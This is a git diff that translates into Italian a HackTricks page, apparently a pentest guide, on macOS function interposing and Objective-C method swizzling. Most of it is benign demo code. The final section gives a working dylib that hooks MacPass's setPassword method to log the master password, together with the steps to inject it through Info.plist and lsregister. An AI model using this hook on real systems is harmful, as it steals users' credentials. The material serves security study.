@@ -2,54 +2,49 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Function Interposing
+## Interposizione delle Funzioni
 
-Create a **dylib** with an **`__interpose`** section (or a section flagged with **`S_INTERPOSING`**) containing tuples of **function pointers** that refer to the **original** and the **replacement** functions.
+Crea un **dylib** con una sezione **`__interpose`** (o una sezione contrassegnata con **`S_INTERPOSING`**) contenente tuple di **puntatori a funzioni** che si riferiscono alle funzioni **originali** e di **sostituzione**.
 
-Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (the interposing needs occur before the main app loads). Obviously the [**restrictions** applied to the use of **`DYLD_INSERT_LIBRARIES`** applies here also](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;
+Poi, **inietta** il dylib con **`DYLD_INSERT_LIBRARIES`** (l'interposizione deve avvenire prima che l'app principale si carichi). Ovviamente, le [**restrizioni** applicate all'uso di **`DYLD_INSERT_LIBRARIES`** si applicano anche qui](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;
 
-### Interpose printf
+### Interponi printf
 
 {{#tabs}}
 {{#tab name="interpose.c"}}
-
 ```c:interpose.c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 #include <stdio.h>
 #include <stdarg.h>
 
 int my_printf(const char *format, ...) {
-    //va_list args;
-    //va_start(args, format);
-    //int ret = vprintf(format, args);
-    //va_end(args);
+//va_list args;
+//va_start(args, format);
+//int ret = vprintf(format, args);
+//va_end(args);
 
-    int ret = printf("Hello from interpose\n");
-    return ret;
+int ret = printf("Hello from interpose\n");
+return ret;
 }
 
 __attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
 __attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
 ```
-
 {{#endtab}}
 
 {{#tab name="hello.c"}}
-
 ```c
 //gcc hello.c -o hello
 #include <stdio.h>
 
 int main() {
-    printf("Hello World!\n");
-    return 0;
+printf("Hello World!\n");
+return 0;
 }
 ```
-
 {{#endtab}}
 
 {{#tab name="interpose2.c"}}
-
 ```c
 // Just another way to define an interpose
 // gcc -dynamiclib interpose2.c -o interpose2.dylib
@@ -57,26 +52,24 @@ int main() {
 #include <stdio.h>
 
 #define DYLD_INTERPOSE(_replacement, _replacee) \
-    __attribute__((used)) static struct { \
-        const void* replacement; \
-        const void* replacee; \
-    } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
-        (const void*) (unsigned long) &_replacement, \
-        (const void*) (unsigned long) &_replacee \
-    };
+__attribute__((used)) static struct { \
+const void* replacement; \
+const void* replacee; \
+} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
+(const void*) (unsigned long) &_replacement, \
+(const void*) (unsigned long) &_replacee \
+};
 
 int my_printf(const char *format, ...)
 {
-    int ret = printf("Hello from interpose\n");
-    return ret;
+int ret = printf("Hello from interpose\n");
+return ret;
 }
 
 DYLD_INTERPOSE(my_printf,printf);
 ```
-
 {{#endtab}}
 {{#endtabs}}
-
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
 Hello from interpose
@@ -84,24 +77,22 @@ Hello from interpose
 DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
 Hello from interpose
 ```
-
 ## Method Swizzling
 
-In ObjectiveC this is how a method is called like: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
+In ObjectiveC questo è come viene chiamato un metodo: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
 
-It's needed the **object**, the **method** and the **params**. And when a method is called a **msg is sent** using the function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
+È necessario l'**oggetto**, il **metodo** e i **parametri**. E quando un metodo viene chiamato, un **msg viene inviato** utilizzando la funzione **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
 
-The object is **`someObject`**, the method is **`@selector(method1p1:p2:)`** and the arguments are **value1**, **value2**.
+L'oggetto è **`someObject`**, il metodo è **`@selector(method1p1:p2:)`** e gli argomenti sono **value1**, **value2**.
 
-Following the object structures, it's possible to reach an **array of methods** where the **names** and **pointers** to the method code are **located**.
+Seguendo le strutture degli oggetti, è possibile raggiungere un'**array di metodi** dove i **nomi** e i **puntatori** al codice del metodo sono **localizzati**.
 
 > [!CAUTION]
-> Note that because methods and classes are accessed based on their names, this information is store in the binary, so it's possible to retrieve it with `otool -ov </path/bin>` or [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
+> Nota che poiché i metodi e le classi vengono accessi in base ai loro nomi, queste informazioni sono memorizzate nel binario, quindi è possibile recuperarle con `otool -ov </path/bin>` o [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
 
 ### Accessing the raw methods
 
-It's possible to access the information of the methods such as name, number of params or address like in the following example:
-
+È possibile accedere alle informazioni dei metodi come nome, numero di parametri o indirizzo come nel seguente esempio:
 ```objectivec
 // gcc -framework Foundation test.m -o test
 
@@ -110,71 +101,69 @@ It's possible to access the information of the methods such as name, number of p
 #import <objc/message.h>
 
 int main() {
-    // Get class of the variable
-    NSString* str = @"This is an example";
-    Class strClass = [str class];
-    NSLog(@"str's Class name: %s", class_getName(strClass));
+// Get class of the variable
+NSString* str = @"This is an example";
+Class strClass = [str class];
+NSLog(@"str's Class name: %s", class_getName(strClass));
 
-    // Get parent class of a class
-    Class strSuper = class_getSuperclass(strClass);
-    NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));
+// Get parent class of a class
+Class strSuper = class_getSuperclass(strClass);
+NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));
 
-    // Get information about a method
-    SEL sel = @selector(length);
-    NSLog(@"Selector name: %@", NSStringFromSelector(sel));
-    Method m = class_getInstanceMethod(strClass,sel);
-    NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
-    NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));
+// Get information about a method
+SEL sel = @selector(length);
+NSLog(@"Selector name: %@", NSStringFromSelector(sel));
+Method m = class_getInstanceMethod(strClass,sel);
+NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
+NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));
 
-    // Iterate through the class hierarchy
-    NSLog(@"Listing methods:");
-    Class currentClass = strClass;
-    while (currentClass != NULL) {
-        unsigned int inheritedMethodCount = 0;
-        Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);
+// Iterate through the class hierarchy
+NSLog(@"Listing methods:");
+Class currentClass = strClass;
+while (currentClass != NULL) {
+unsigned int inheritedMethodCount = 0;
+Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);
 
-        NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);
+NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);
 
-        for (unsigned int i = 0; i < inheritedMethodCount; i++) {
-            Method method = inheritedMethods[i];
-            SEL selector = method_getName(method);
-            const char* methodName = sel_getName(selector);
-            unsigned long address = (unsigned long)method_getImplementation(m);
-            NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
-        }
+for (unsigned int i = 0; i < inheritedMethodCount; i++) {
+Method method = inheritedMethods[i];
+SEL selector = method_getName(method);
+const char* methodName = sel_getName(selector);
+unsigned long address = (unsigned long)method_getImplementation(m);
+NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
+}
 
-        // Free the memory allocated by class_copyMethodList
-        free(inheritedMethods);
-        currentClass = class_getSuperclass(currentClass);
-    }
+// Free the memory allocated by class_copyMethodList
+free(inheritedMethods);
+currentClass = class_getSuperclass(currentClass);
+}
 
-    // Other ways to call uppercaseString method
-    if([str respondsToSelector:@selector(uppercaseString)]) {
-        NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
-        NSLog(@"Uppercase string: %@", uppercaseString);
-    }
+// Other ways to call uppercaseString method
+if([str respondsToSelector:@selector(uppercaseString)]) {
+NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
+NSLog(@"Uppercase string: %@", uppercaseString);
+}
 
-    // Using objc_msgSend directly
-    NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
-    NSLog(@"Uppercase string: %@", uppercaseString2);
+// Using objc_msgSend directly
+NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
+NSLog(@"Uppercase string: %@", uppercaseString2);
 
-    // Calling the address directly
-    IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
-    NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
-    NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
-    NSLog(@"Uppercase string: %@", uppercaseString3);
+// Calling the address directly
+IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
+NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
+NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
+NSLog(@"Uppercase string: %@", uppercaseString3);
 
-    return 0;
+return 0;
 }
 ```
+### Method Swizzling con method_exchangeImplementations
 
-### Method Swizzling with method_exchangeImplementations
-
-The function **`method_exchangeImplementations`** allows to **change** the **address** of the **implementation** of **one function for the other**.
+La funzione **`method_exchangeImplementations`** consente di **cambiare** l'**indirizzo** dell'**implementazione** di **una funzione con l'altra**.
 
 > [!CAUTION]
-> So when a function is called what is **executed is the other one**.
-
+> Quindi, quando una funzione viene chiamata, ciò che viene **eseguito è l'altra**.
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
 
@@ -192,44 +181,42 @@ The function **`method_exchangeImplementations`** allows to **change** the **add
 @implementation NSString (SwizzleString)
 
 - (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
-    NSLog(@"Custom implementation of substringFromIndex:");
+NSLog(@"Custom implementation of substringFromIndex:");
 
-    // Call the original method
-    return [self swizzledSubstringFromIndex:from];
+// Call the original method
+return [self swizzledSubstringFromIndex:from];
 }
 
 @end
 
 int main(int argc, const char * argv[]) {
-    // Perform method swizzling
-    Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
-    Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
-    method_exchangeImplementations(originalMethod, swizzledMethod);
+// Perform method swizzling
+Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
+Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
+method_exchangeImplementations(originalMethod, swizzledMethod);
 
-    // We changed the address of one method for the other
-    // Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
-    // And when swizzledSubstringFromIndex is called, substringFromIndex is really colled
+// We changed the address of one method for the other
+// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
+// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled
 
-    // Example usage
-    NSString *myString = @"Hello, World!";
-    NSString *subString = [myString substringFromIndex:7];
-    NSLog(@"Substring: %@", subString);
+// Example usage
+NSString *myString = @"Hello, World!";
+NSString *subString = [myString substringFromIndex:7];
+NSLog(@"Substring: %@", subString);
 
-    return 0;
+return 0;
 }
 ```
-
 > [!WARNING]
-> In this case if the **implementation code of the legit** method **verifies** the **method** **name** it could **detect** this swizzling and prevent it from running.
+> In questo caso, se il **codice di implementazione del metodo legittimo** **verifica** il **nome del metodo**, potrebbe **rilevare** questo swizzling e impedirne l'esecuzione.
 >
-> The following technique doesn't have this restriction.
+> La seguente tecnica non ha questa restrizione.
 
-### Method Swizzling with method_setImplementation
+### Method Swizzling con method_setImplementation
 
-The previous format is weird because you are changing the implementation of 2 methods one from the other. Using the function **`method_setImplementation`** you can **change** the **implementation** of a **method for the other one**.
+Il formato precedente è strano perché stai cambiando l'implementazione di 2 metodi l'uno con l'altro. Utilizzando la funzione **`method_setImplementation`**, puoi **cambiare** l'**implementazione** di un **metodo con l'altro**.
 
-Just remember to **store the address of the implementation of the original one** if you are going to to call it from the new implementation before overwriting it because later it will be much complicated to locate that address.
-
+Ricorda solo di **memorizzare l'indirizzo dell'implementazione di quello originale** se intendi chiamarlo dalla nuova implementazione prima di sovrascriverlo, perché in seguito sarà molto più complicato localizzare quell'indirizzo.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -246,75 +233,69 @@ static IMP original_substringFromIndex = NULL;
 @implementation NSString (Swizzlestring)
 
 - (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
-    NSLog(@"Custom implementation of substringFromIndex:");
+NSLog(@"Custom implementation of substringFromIndex:");
 
-    // Call the original implementation using objc_msgSendSuper
-    return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
+// Call the original implementation using objc_msgSendSuper
+return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
 }
 
 @end
 
 int main(int argc, const char * argv[]) {
-    @autoreleasepool {
-        // Get the class of the target method
-        Class stringClass = [NSString class];
+@autoreleasepool {
+// Get the class of the target method
+Class stringClass = [NSString class];
 
-        // Get the swizzled and original methods
-        Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));
+// Get the swizzled and original methods
+Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));
 
-        // Get the function pointer to the swizzled method's implementation
-        IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));
+// Get the function pointer to the swizzled method's implementation
+IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));
 
-        // Swap the implementations
-        // It return the now overwritten implementation of the original method to store it
-        original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);
+// Swap the implementations
+// It return the now overwritten implementation of the original method to store it
+original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);
 
-        // Example usage
-        NSString *myString = @"Hello, World!";
-        NSString *subString = [myString substringFromIndex:7];
-        NSLog(@"Substring: %@", subString);
+// Example usage
+NSString *myString = @"Hello, World!";
+NSString *subString = [myString substringFromIndex:7];
+NSLog(@"Substring: %@", subString);
 
-        // Set the original implementation back
-        method_setImplementation(originalMethod, original_substringFromIndex);
+// Set the original implementation back
+method_setImplementation(originalMethod, original_substringFromIndex);
 
-        return 0;
-    }
+return 0;
+}
 }
 ```
-
 ## Hooking Attack Methodology
 
-In this page different ways to hook functions were discussed. However, they involved **running code inside the process to attack**.
+In questa pagina sono stati discussi diversi modi per agganciare funzioni. Tuttavia, comportavano **l'esecuzione di codice all'interno del processo per attaccare**.
 
-In order to do that the easiest technique to use is to inject a [Dyld via environment variables or hijacking](../macos-dyld-hijacking-and-dyld_insert_libraries.md). However, I guess this could also be done via [Dylib process injection](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).
+Per fare ciò, la tecnica più semplice da utilizzare è iniettare un [Dyld tramite variabili di ambiente o hijacking](../macos-dyld-hijacking-and-dyld_insert_libraries.md). Tuttavia, suppongo che questo possa essere fatto anche tramite [Dylib process injection](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).
 
-However, both options are **limited** to **unprotected** binaries/processes. Check each technique to learn more about the limitations.
+Tuttavia, entrambe le opzioni sono **limitati** a **binarie/processi non protetti**. Controlla ciascuna tecnica per saperne di più sulle limitazioni.
 
-However, a function hooking attack is very specific, an attacker will do this to **steal sensitive information from inside a process** (if not you would just do a process injection attack). And this sensitive information might be located in user downloaded Apps such as MacPass.
+Tuttavia, un attacco di hooking di funzione è molto specifico, un attaccante lo farà per **rubare informazioni sensibili dall'interno di un processo** (se no faresti semplicemente un attacco di iniezione di processo). E queste informazioni sensibili potrebbero trovarsi in app scaricate dall'utente come MacPass.
 
-So the attacker vector would be to either find a vulnerability or strip the signature of the application, inject the **`DYLD_INSERT_LIBRARIES`** env variable through the Info.plist of the application adding something like:
-
+Quindi il vettore dell'attaccante sarebbe quello di trovare una vulnerabilità o rimuovere la firma dell'applicazione, iniettare la variabile env **`DYLD_INSERT_LIBRARIES`** attraverso l'Info.plist dell'applicazione aggiungendo qualcosa come:
 ```xml
 <key>LSEnvironment</key>
 <dict>
-    <key>DYLD_INSERT_LIBRARIES</key>
-    <string>/Applications/Application.app/Contents/malicious.dylib</string>
+<key>DYLD_INSERT_LIBRARIES</key>
+<string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
-
-and then **re-register** the application:
-
+e poi **ri-registrare** l'applicazione:
 ```bash
 /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
 ```
-
-Add in that library the hooking code to exfiltrate the information: Passwords, messages...
+Aggiungi in quella libreria il codice di hooking per esfiltrare le informazioni: Passwords, messages...
 
 > [!CAUTION]
-> Note that in newer versions of macOS if you **strip the signature** of the application binary and it was previously executed, macOS **won't be executing the application** anymore.
+> Nota che nelle versioni più recenti di macOS se **rimuovi la firma** del binario dell'applicazione e questa è stata eseguita in precedenza, macOS **non eseguirà più l'applicazione**.
 
-#### Library example
-
+#### Esempio di libreria
 ```objectivec
 // gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib
 
@@ -331,27 +312,26 @@ static IMP real_setPassword = NULL;
 
 static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
 {
-    // Function that will log the password and call the original setPassword(pass, file_path) method
-    NSLog(@"[+] Password is: %@", password);
+// Function that will log the password and call the original setPassword(pass, file_path) method
+NSLog(@"[+] Password is: %@", password);
 
-    // After logging the password call the original method so nothing breaks.
-    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
+// After logging the password call the original method so nothing breaks.
+return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
 }
 
 // Library constructor to execute
 __attribute__((constructor))
 static void customConstructor(int argc, const char **argv) {
-    // Get the real method address to not lose it
-    Class classMPDocument = NSClassFromString(@"MPDocument");
-    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
+// Get the real method address to not lose it
+Class classMPDocument = NSClassFromString(@"MPDocument");
+Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
 
-    // Make the original method setPassword call the fake implementation one
-    IMP fake_IMP = (IMP)custom_setPassword;
-    real_setPassword = method_setImplementation(real_Method, fake_IMP);
+// Make the original method setPassword call the fake implementation one
+IMP fake_IMP = (IMP)custom_setPassword;
+real_setPassword = method_setImplementation(real_Method, fake_IMP);
 }
 ```
-
-## References
+## Riferimenti
 
 - [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
 
